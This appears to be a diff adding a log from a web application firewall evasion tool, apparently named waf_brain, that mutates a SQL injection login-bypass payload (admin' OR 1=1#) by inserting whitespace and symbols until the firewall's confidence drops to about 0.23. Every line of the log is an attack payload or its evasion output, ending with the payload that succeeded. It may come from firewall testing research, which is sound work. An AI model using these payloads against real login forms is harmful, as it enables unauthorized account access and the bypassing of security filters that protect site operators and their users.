@@ -1,0 +1,24 @@
+########
+Using whitespace_to_symbols + swap_keywords in waf_brain
+########
+admin'    
+OR     1=1#
+[' ']
+admin'   ( OR 
+   1=1#
+[' ']
+admin'@  (  OR  
+   1=1#
+[' ']
+admin',  (   OR  @
+   1=1#
+[' ']
+admin'   (   OR -@
+  ,1=1#
+
+
+[+] Threshold reached
+Reached confidence 0.23333333432674408
+with payload
+admin'   (  -  OR    @
+  ,1=1#
